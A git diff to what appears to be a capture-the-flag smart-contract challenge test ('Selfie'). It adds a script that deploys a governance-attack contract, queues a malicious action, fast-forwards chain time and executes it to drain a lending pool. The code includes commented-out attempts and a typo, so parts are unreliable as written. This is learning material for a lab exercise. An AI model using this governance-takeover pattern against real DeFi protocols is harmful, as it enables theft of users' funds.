@@ -31,6 +31,29 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+//	await this.token.transferFrom(this.pool.address,attacker.address,TOKENS_IN_POOL);
+//	await this.token.transfer(attacker.address,TOKENS_IN_POOL);
+        console.log(attacker.addres);
+	console.log(this.token.balanceOf(attacker.address));
+	const forceFactory = await ethers.getContractFactory('ForceSendEther', deployer);
+        this.forceEther = await forceFactory.deploy();
+        await deployer.sendTransaction({to: this.forceEther.address, value: ethers.utils.parseEther("100.0"), });
+
+        const attackPoolFactory = await ethers.getContractFactory('GovernanceAttack', deployer);
+        this.poolAttack = await attackPoolFactory.deploy(this.governance.address,this.pool.address,this.token.address,attacker.address,this.forceEther.address);
+//        await ethers.provider.transfer(this.poolAttack, ethers.utils.parseEther('1') ); 
+        await ethers.provider.call({to: this.poolAttack.address,value:  ethers.utils.parseEther('1')  });
+        await deployer.sendTransaction({to: this.poolAttack.address, value: ethers.utils.parseEther("1.0"), });
+	console.log(this.governance.address);
+	console.log("before queue");
+        await this.poolAttack.attackQueue();
+	console.log("after queue");
+	console.log("before attack");
+        //pass two days 3600 * 24 * 2
+        await network.provider.send("evm_increaseTime", [172801] );
+        await this.poolAttack.attackExecute();
+	console.log("after attack");
+
     });
 
     after(async function () {
